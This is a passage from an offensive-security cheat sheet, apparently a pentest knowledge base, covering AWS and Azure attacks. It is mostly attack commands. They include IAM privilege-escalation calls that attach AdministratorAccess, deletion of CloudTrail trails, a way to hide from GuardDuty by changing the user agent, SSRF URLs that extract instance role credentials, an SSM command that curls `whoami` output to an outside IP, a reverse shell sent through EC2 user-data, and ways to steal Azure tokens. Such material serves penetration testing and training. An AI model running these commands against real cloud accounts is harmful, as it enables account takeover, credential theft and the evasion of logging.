shell\nreport: Generate HTML report. Includes summary of the accounts and audit findings.\niam_report: Generate HTML report for the IAM information of an account.\naudit: Check for potential misconfigurations.\ncollect: Collect metadata about an account.\nfind_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges\n</code></pre></p> </li> <li> <p>cyberark/SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins     <pre><code>$ powershell -ExecutionPolicy Bypass -NoProfile\nPS C&gt; Import-Module .\\SkyArk.ps1 -force\nPS C&gt; Start-AWStealth\nPS C&gt; Scan-AWShadowAdmins  \n</code></pre></p> </li> <li> <p>BishopFox/CloudFox - Automating situational awareness for cloud penetration tests. Designed for white box enumeration (SecurityAudit/ReadOnly type permission), but can be used for black box (found credentials) as well.     <pre><code>cloudfox aws --profile [profile-name] all-checks\n</code></pre></p> </li> <li> <p>toniblyx/Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness. It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100).   <pre><code>$ pip install awscli ansi2html detect-secrets\n$ sudo apt install jq\n$ ./prowler -E check42,check43\n$ ./prowler -p custom-profile -r us-east-1 -c check11\n$ ./prowler -A 123456789012 -R ProwlerRole\n</code></pre></p> </li> <li> <p>nccgroup/PMapper - A tool for quickly evaluating IAM permissions in AWS     <pre><code>pip install principalmapper\npmapper graph --create\npmapper visualize --filetype png\npmapper analysis --output-type text\n\n# Determine if PowerUser can escalate privileges\npmapper query \"preset privesc user/PowerUser\"\npmapper argquery --principal user/PowerUser --preset privesc\n\n# Find all principals that can escalate privileges\npmapper query \"preset privesc *\"\npmapper argquery --principal '*' --preset privesc\n\n# Find all principals that PowerUser can access\npmapper query \"preset connected user/PowerUser *\"\npmapper argquery --principal user/PowerUser --resource '*' --preset connected\n\n# Find all principals that can access PowerUser\npmapper query \"preset connected * user/PowerUser\"\npmapper argquery --principal '*' --resource user/PowerUser --preset connected\n</code></pre></p> </li> </ul>"},{"location":"cloud/aws/aws-enumeration/#aws-enumerate-iam-permissions","title":"AWS - Enumerate IAM permissions","text":"<p>Enumerate the permissions associated with AWS credential set with andresriancho/enumerate-iam</p> <pre><code>git clone git@github.com:andresriancho/enumerate-iam.git\npip install -r requirements.txt\n./enumerate-iam.py --access-key AKIA... --secret-key StF0q...\n2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id \"AKIA...\"\n2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked!\n2019-05-10 15:58:01,537 - 21345 - [INFO] -- {\n    \"RoleDetailList\": [\n        {\n            \"Tags\": [],\n            \"AssumeRolePolicyDocument\": {\n                \"Version\": \"2008-10-17\",\n                \"Statement\": [\n                    {\n...\n2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked!\n2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked!\n2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked!\n2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked!\n2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked!\n</code></pre>"},{"location":"cloud/aws/aws-enumeration/#references","title":"References","text":"<ul> <li>An introduction to penetration testing AWS - Akimbocore - HollyGraceful - 06 August 2021</li> <li>AWS CLI Cheatsheet - apolloclark</li> <li>AWS - Cheatsheet - @Magnussen</li> <li>Pacu Open source AWS Exploitation framework - RhinoSecurityLabs</li> <li>PACU Spencer Gietzen - 30 juil. 2018</li> </ul>"},{"location":"cloud/aws/aws-iam/","title":"AWS - Identity &amp; Access Management","text":""},{"location":"cloud/aws/aws-iam/#aws-shadow-admin","title":"AWS - Shadow Admin","text":""},{"location":"cloud/aws/aws-iam/#admin-equivalent-permission","title":"Admin equivalent permission","text":"<ul> <li> <p>AdministratorAccess</p> <pre><code>\"Action\": \"*\"\n\"Resource\": \"*\"\n</code></pre> </li> <li> <p>ec2:AssociateIamInstanceProfile : attach an IAM instance profile to an EC2 instance     <pre><code>aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789\n</code></pre></p> </li> <li> <p>iam:CreateAccessKey : create a new access key to another IAM admin account     <pre><code>aws iam create-access-key \u2013user-name target_user\n</code></pre></p> </li> <li> <p>iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it      <pre><code>$ aws iam create-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required\n</code></pre></p> </li> <li> <p>iam:UpdateLoginProfile : reset other IAM users\u2019 login passwords.     <pre><code>$ aws iam update-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required\n</code></pre></p> </li> <li> <p>iam:AttachUserPolicy, iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses     <pre><code>$ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n$ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n$ aws iam attach-role-policy \u2013role-name role_i_can_assume \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n</code></pre></p> </li> <li> <p>iam:PutUserPolicy, iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.     <pre><code>$ aws iam put-user-policy \u2013user-name my_username \u2013policy-name my_inline_policy \u2013policy-document file://path/to/administrator/policy.json\n</code></pre></p> </li> <li> <p>iam:CreatePolicy : add a stealthy admin policy</p> </li> <li> <p>iam:AddUserToGroup : add into the admin group of the organization.     <pre><code>$ aws iam add-user-to-group \u2013group-name target_group \u2013user-name my_username\n</code></pre></p> </li> <li> <p>iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account.     <pre><code>$ aws iam update-assume-role-policy \u2013role-name role_i_can_assume \u2013policy-document file://path/to/assume/role/policy.json\n</code></pre></p> </li> <li> <p>iam:CreatePolicyVersion &amp; iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one.     <pre><code>$ aws iam create-policy-version \u2013policy-arn target_policy_arn \u2013policy-document file://path/to/administrator/policy.json \u2013set-as-default\n$ aws iam set-default-policy-version \u2013policy-arn target_policy_arn \u2013version-id v2\n</code></pre></p> </li> <li> <p>lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.     <pre><code>$ aws lambda update-function-code \u2013function-name target_function \u2013zip-file fileb://my/lambda/code/zipped.zip\n</code></pre></p> </li> <li> <p>glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.     <pre><code>$ aws glue \u2013endpoint-name target_endpoint \u2013public-key file://path/to/my/public/ssh/key.pub\n</code></pre></p> </li> <li> <p>iam:PassRole + ec2:CreateInstanceProfile/ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.</p> </li> <li> <p>iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.     <pre><code># add ssh key\n$ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013key-name my_ssh_key \u2013security-group-ids sg-123456\n# execute a reverse shell\n$ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013user-data file://script/with/reverse/shell.sh\n</code></pre></p> </li> <li> <p>iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account.     <pre><code>$ aws lambda create-function \u2013function-name my_function \u2013runtime python3.6 \u2013role arn_of_lambda_role \u2013handler lambda_function.lambda_handler \u2013code file://my/python/code.py\n$ aws lambda invoke \u2013function-name my_function output.txt\n</code></pre>     Example of code.py     <pre><code>import boto3\ndef lambda_handler(event, context):\n    client = boto3.client('iam')\n    response = client.attach_user_policy(\n    UserName='my_username',\n    PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\"\n    )\n    return response\n</code></pre></p> </li> <li> <p>iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account.     <pre><code>$ aws glue create-dev-endpoint \u2013endpoint-name my_dev_endpoint \u2013role-arn arn_of_glue_service_role \u2013public-key file://path/to/my/public/ssh/key.pub\n</code></pre></p> </li> </ul>"},{"location":"cloud/aws/aws-iam/#references","title":"References","text":"<ul> <li>Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk</li> </ul>"},{"location":"cloud/aws/aws-ioc-detection/","title":"AWS - IOC &amp; Detections","text":""},{"location":"cloud/aws/aws-ioc-detection/#cloudtrail","title":"CloudTrail","text":""},{"location":"cloud/aws/aws-ioc-detection/#disable-cloudtrail","title":"Disable CloudTrail","text":"<pre><code>$ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator\n</code></pre> <p>Disable monitoring of events from global services </p> <pre><code>$ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event \n</code></pre> <p>Disable Cloud Trail on specific regions</p> <pre><code>$ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west\n</code></pre>"},{"location":"cloud/aws/aws-ioc-detection/#guardduty","title":"GuardDuty","text":""},{"location":"cloud/aws/aws-ioc-detection/#os-user-agent","title":"OS User Agent","text":"<p> When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent.</p> <p>Pacu bypass this problem by defining a custom User-Agent: pacu.py#L1473</p> <pre><code>boto3_session = boto3.session.Session()\nua = boto3_session._session.user_agent()\nif 'kali' in ua.lower() or 'parrot' in ua.lower() or 'pentoo' in ua.lower():  # If the local OS is Kali/Parrot/Pentoo Linux\n    # GuardDuty triggers a finding around API calls made from Kali Linux, so let's avoid that...\n    self.print('Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...')\n</code></pre>"},{"location":"cloud/aws/aws-lambda/","title":"AWS - Service - Lambda","text":""},{"location":"cloud/aws/aws-lambda/#extract-functions-code","title":"Extract function's code","text":"<pre><code>aws lambda list-functions --profile uploadcreds\naws lambda get-function --function-name \"LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY\" --query 'Code.Location' --profile uploadcreds\nwget -O lambda-function.zip url-from-previous-query --profile uploadcreds\n</code></pre>"},{"location":"cloud/aws/aws-lambda/#references","title":"References","text":"<ul> <li>Getting shell and data access in AWS by chaining vulnerabilities - Appsecco - Riyaz Walikar - Aug 29, 2019</li> </ul>"},{"location":"cloud/aws/aws-metadata/","title":"AWS - Metadata SSRF","text":"<p>AWS released additional security defences against the attack.</p> <p> Only working with IMDSv1. Enabling IMDSv2 : <code>aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required</code>.</p> <p>In order to use IMDSv2 you must provide a token.</p> <pre><code>export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"\n</code></pre>"},{"location":"cloud/aws/aws-metadata/#method-for-elastic-cloud-compute-ec2","title":"Method for Elastic Cloud Compute (EC2)","text":"<p>Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/</p> <ol> <li>Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/     <pre><code>ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\niam/\nidentity-credentials/\ninstance-action\ninstance-id\n</code></pre></li> <li>Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/</li> <li>Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/     <pre><code>{\n\"Code\" : \"Success\",\n\"LastUpdated\" : \"2019-07-31T23:08:10Z\",\n\"Type\" : \"AWS-HMAC\",\n\"AccessKeyId\" : \"ASIA54BL6PJR37YOEP67\",\n\"SecretAccessKey\" : \"OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2\",\n\"Token\" : \"AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv\",\n\"Expiration\" : \"2019-08-01T05:20:30Z\"\n}\n</code></pre></li> </ol>"},{"location":"cloud/aws/aws-metadata/#method-for-container-service-fargate","title":"Method for Container Service (Fargate)","text":"<ol> <li>Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ     <pre><code>JAVA_ALPINE_VERSION=8.212.04-r0\nHOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root\nAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447\nAWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2\nECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd\n</code></pre></li> <li>Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447     <pre><code>{\n    \"RoleArn\": \"arn:aws:iam::953574914659:role/awesome-waf-role\",\n    \"AccessKeyId\": \"ASIA54BL6PJR2L75XHVS\",\n    \"SecretAccessKey\": \"j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt\",\n    \"Token\": \"FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==\",\n    \"Expiration\": \"2019-09-18T04:05:59Z\"\n}\n</code></pre></li> </ol>"},{"location":"cloud/aws/aws-metadata/#aws-api-calls-that-return-credentials","title":"AWS API calls that return credentials","text":"<ul> <li>chime:createapikey</li> <li>codepipeline:pollforjobs</li> <li>cognito-identity:getopenidtoken</li> <li>cognito-identity:getopenidtokenfordeveloperidentity</li> <li>cognito-identity:getcredentialsforidentity</li> <li>connect:getfederationtoken</li> <li>connect:getfederationtokens</li> <li>ecr:getauthorizationtoken</li> <li>gamelift:requestuploadcredentials</li> <li>iam:createaccesskey</li> <li>iam:createloginprofile</li> <li>iam:createservicespecificcredential</li> <li>iam:resetservicespecificcredential</li> <li>iam:updateaccesskey</li> <li>lightsail:getinstanceaccessdetails</li> <li>lightsail:getrelationaldatabasemasteruserpassword</li> <li>rds-db:connect</li> <li>redshift:getclustercredentials</li> <li>sso:getrolecredentials</li> <li>mediapackage:rotatechannelcredentials</li> <li>mediapackage:rotateingestendpointcredentials</li> <li>sts:assumerole</li> <li>sts:assumerolewithsaml</li> <li>sts:assumerolewithwebidentity</li> <li>sts:getfederationtoken</li> <li>sts:getsessiontoken</li> </ul>"},{"location":"cloud/aws/aws-metadata/#references","title":"References","text":"<ul> <li>AWS API calls that return credentials - kmcquade</li> <li>Cloud security instance metadata - PumaScan - Eric Johnson - 09 Oct 2019</li> <li>Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019</li> <li>Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018</li> <li>Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 </li> </ul>"},{"location":"cloud/aws/aws-s3-bucket/","title":"AWS - Service - S3 Buckets","text":""},{"location":"cloud/aws/aws-s3-bucket/#tools","title":"Tools","text":"<ul> <li> <p>digi.ninja/bucket-finder - Search for public buckets, list and download all files if directory indexing is enabled     <pre><code>wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2\n./bucket_finder.rb my_words\n./bucket_finder.rb --region ie my_words\n./bucket_finder.rb --download --region ie my_words\n./bucket_finder.rb --log-file bucket.out my_words\n</code></pre></p> </li> <li> <p>aws-sdk/boto3 - Amazon Web Services (AWS) SDK for Python     <pre><code>import boto3\ns3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')\n\ntry:\n    result = s3.list_buckets()\n    print(result)\nexcept Exception as e:\n    print(e)\n</code></pre></p> </li> <li> <p>nccgroup/s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files     <pre><code>$ python3 -m venv env &amp;&amp; source env/bin/activate\n$ pip install -r requirements.txt\n$ python s3-objects-check.py -h\n$ python s3-objects-check.py -p whitebox-profile -e blackbox-profile\n</code></pre></p> </li> <li> <p>grayhatwarfare/buckets - Search Public Buckets</p> </li> </ul>"},{"location":"cloud/aws/aws-s3-bucket/#_1","title":"AWS - Service - S3 Buckets","text":""},{"location":"cloud/aws/aws-s3-bucket/#references","title":"References","text":""},{"location":"cloud/aws/aws-ssm/","title":"AWS - Service - SSM","text":""},{"location":"cloud/aws/aws-ssm/#command-execution","title":"Command execution","text":"<p> The ssm-user account is not removed from the system when SSM Agent is uninstalled.</p> <p>SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs):</p> <ul> <li>Windows Server 2008-2012 R2 AMIs published in November 2016 or later</li> <li>Windows Server 2016 and 2019</li> <li>Amazon Linux</li> <li>Amazon Linux 2</li> <li>Ubuntu Server 16.04</li> <li>Ubuntu Server 18.04</li> <li>Amazon ECS-Optimized</li> </ul> <pre><code>$ aws ssm describe-instance-information --profile stolencreds --region eu-west-1  \n$ aws ssm send-command --instance-ids \"INSTANCE-ID-HERE\" --document-name \"AWS-RunShellScript\" --comment \"IP Config\" --parameters commands=ifconfig --output text --query \"Command.CommandId\" --profile stolencreds\n$ aws ssm list-command-invocations --command-id \"COMMAND-ID-HERE\" --details --query \"CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}\" --profile stolencreds\n\ne.g:\n$ aws ssm send-command --instance-ids \"i-05b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080/`whoami`' --output text --region=us-east-1\n</code></pre>"},{"location":"cloud/aws/aws-ssm/#references","title":"References","text":""},{"location":"cloud/aws/aws-training/","title":"AWS - Training","text":"<ul> <li>bishopfox/CloudFoxable: A Gamified Cloud Hacking Sandbox</li> <li>ine-labs/AWSGoat : A Damn Vulnerable AWS Infrastructure</li> <li>m6a-UdS/dvca - A demonstration project to show how to do privilege escalation on AWS</li> <li>nccgroup/sadcloud -  A tool for standing up (and tearing down!) purposefully insecure cloud infrastructure</li> <li>0xdabbad00/Flaws - Several level of challenges around AWS</li> <li>RhinoSecurityLabs/cloudgoat - \"Vulnerable by Design\" AWS deployment tool</li> </ul>"},{"location":"cloud/azure/azure-access-and-token/","title":"Azure AD Tokens","text":""},{"location":"cloud/azure/azure-access-and-token/#connection","title":"Connection","text":"<p>When you authenticate to the Microsoft Graph API in PowerShell/CLI, you will be using an application from a Microsoft's tenant.</p> <ul> <li>Microsoft Applications ID</li> </ul> Name Application ID Microsoft Azure PowerShell 1950a258-227b-4e31-a9cf-717495945fc2 Microsoft Azure CLI 04b07795-8ddb-461a-bbee-02f9e1bf7b46 Portail Azure c44b4083-3bb0-49c1-b47d-974e53cbdf3c <p>After a successfull authentication, you will get an access token.</p>"},{"location":"cloud/azure/azure-access-and-token/#az-cli","title":"az cli","text":"<ul> <li>Login with credentials     <pre><code>az login -u &lt;username&gt; -p &lt;password&gt;\naz login --service-principal -u &lt;app-id&gt; -p &lt;password&gt; --tenant &lt;tenant-id&gt;\n</code></pre></li> <li>Get token     <pre><code>az account get-access-token\naz account get-access-token --resource-type aad-graph\n</code></pre></li> </ul> <p>Whoami equivalent: <code>az ad signed-in-user show</code></p>"},{"location":"cloud/azure/azure-access-and-token/#azure-ad-powershell","title":"Azure AD Powershell","text":"<ul> <li>Login with credentials     <pre><code>$passwd = ConvertTo-SecureString \"&lt;PASSWORD&gt;\" -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential(\"test@&lt;TENANT NAME&gt;.onmicrosoft.com\", $passwd)\nConnect-AzureAD -Credential $creds\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#az-powershell","title":"Az Powershell","text":"<ul> <li>Login with credentials     <pre><code>$passwd = ConvertTo-SecureString \"&lt;PASSWORD&gt;\" -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential (\"&lt;USERNAME&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com\", $passwd)\nConnect-AzAccount -Credential $creds\n</code></pre></li> <li>Login with service principal secret     <pre><code>$password = ConvertTo-SecureString '&lt;SECRET&gt;' -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential('&lt;APP-ID&gt;', $password)\nConnect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d\n</code></pre></li> <li>Get token     <pre><code>(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token\nGet-AzAccessToken -ResourceTypeName MSGraph\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#microsoft-graph-powershell","title":"Microsoft Graph Powershell","text":"<ul> <li>Login with credentials     <pre><code>Connect-MgGraph\nConnect-MgGraph -Scopes \"User.Read.All\", \"Group.ReadWrite.All\"\n</code></pre></li> <li>Login with device code flow     <pre><code>Connect-MgGraph -Scopes \"User.Read.All\", \"Group.ReadWrite.All\" -UseDeviceAuthentication\n</code></pre></li> </ul> <p>Whoami equivalent: <code>Get-MgContext</code></p>"},{"location":"cloud/azure/azure-access-and-token/#external-http-api","title":"External HTTP API","text":"<ul> <li>Login with credentials     </li> <li> <p>Login with device code flow     <pre><code># paste this in a PowerShell console\n$body = @{\n    \"client_id\" =     \"1950a258-227b-4e31-a9cf-717495945fc2\"!\n    \"resource\" =      \"https://graph.microsoft.com\"\n}\n$UserAgent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\"\n$Headers=@{}\n$Headers[\"User-Agent\"] = $UserAgent\n$authResponse = Invoke-RestMethod `\n    -UseBasicParsing `\n    -Method Post `\n    -Uri \"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0\" `\n    -Headers $Headers `\n    -Body $body\n$authResponse\n\n# then browse to https://microsoft.com/devicelogin and use the device_code\n# finally execute this command to ask for tokens\n$body=@{\n    \"client_id\" =  \"1950a258-227b-4e31-a9cf-717495945fc2\"\n    \"grant_type\" = \"urn:ietf:params:oauth:grant-type:device_code\"\n    \"code\" =       $authResponse.device_code\n}\n$Tokens = Invoke-RestMethod `\n    -UseBasicParsing `\n    -Method Post `\n    -Uri \"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0\" `\n    -Headers $Headers `\n    -Body $body\n$Tokens\n</code></pre></p> </li> <li> <p>Request an access token using a service principal password <pre><code>curl --location --request POST 'https://login.microsoftonline.com/&lt;tenant-name&gt;/oauth2/v2.0/token' \\\n--header 'Content-Type: application/x-www-form-urlencoded' \\\n--data-urlencode 'client_id=&lt;client-id&gt;' \\\n--data-urlencode 'scope=https://graph.microsoft.com/.default' \\\n--data-urlencode 'client_secret=&lt;client-secret&gt;' \\\n--data-urlencode 'grant_type=client_credentials'\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#internal-http-api","title":"Internal HTTP API","text":"<p>MSI_ENDPOINT is an alias for IDENTITY_ENDPOINT, and MSI_SECRET is an alias for IDENTITY_HEADER.</p> <p>Find <code>IDENTITY_HEADER</code> and <code>IDENTITY_ENDPOINT</code> from the environment variables: <code>env</code></p> <p>Most of the time, you want a token for one of these resources: </p> <ul> <li>https://graph.microsoft.com</li> <li>https://management.azure.com</li> <li>https://storage.azure.com</li> <li> <p>https://vault.azure.net</p> </li> <li> <p>PowerShell     <pre><code>curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;api-version=2017-09-01\" -H secret:$IDENTITY_HEADER\ncurl \"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;api-version=2017-09-01\" -H secret:$IDENTITY_HEADER\n</code></pre></p> </li> <li>Azure Function (Python)     <pre><code>import logging, os\nimport azure.functions as func\n\ndef main(req: func.HttpRequest) -&gt; func.HttpResponse:\n    logging.info('Python HTTP trigger function processed a request.')\n    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']\n    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']\n    cmd = 'curl \"%s?resource=https://management.azure.com&amp;apiversion=2017-09-01\" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)\n    val = os.popen(cmd).read()\n    return func.HttpResponse(val, status_code=200)\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#access-token","title":"Access Token","text":"<p>An access token is a type of security token issued by Azure Active Directory (Azure AD) that grants a user or application permission to access resources. These resources could be anything from APIs, web applications, data stored in Azure, or other services that are integrated with Azure AD for authentication and authorization.</p> <p>Decode access tokens: jwt.ms</p> <ul> <li>Use the access token with MgGraph <pre><code># use the jwt\n$token = \"eyJ0eXAiO...\"\n$secure = $token | ConvertTo-SecureString -AsPlainText -Force\nConnect-MgGraph -AccessToken $secure\n</code></pre></li> <li>Use the access token with AzureAD <pre><code>Connect-AzureAD -AadAccessToken &lt;access-token&gt; -TenantId &lt;tenant-id&gt; -AccountId &lt;account-id&gt;\n</code></pre></li> <li>Use the access token with Az Powershell <pre><code>Connect-AzAccount -AccessToken &lt;access-token&gt; -AccountId &lt;account-id&gt;\nConnect-AzAccount -AccessToken &lt;access-token&gt; -GraphAccessToken &lt;graph-access-token&gt; -AccountId &lt;account-id&gt;\n</code></pre></li> <li>Use the access token with the API <pre><code>$Token = 'eyJ0eX..'\n$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'\n# $URI = 'https://graph.microsoft.com/v1.0/applications'\n$RequestParams = @{\n    Method = 'GET'\n    Uri = $URI\n    Headers = @{\n        'Authorization' = \"Bearer $Token\"\n    }\n}\n(Invoke-RestMethod @RequestParams).value \n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-access-and-token/#access-token-locations","title":"Access Token Locations","text":"<p>Tokens are stored by default on the disk in you use Azure Cloud Shell. They canbe extracted by dumping the content of the storage account.</p> <ul> <li> <p>az cli</p> <ul> <li>az cli stores access tokens in clear text in accessTokens.json in the 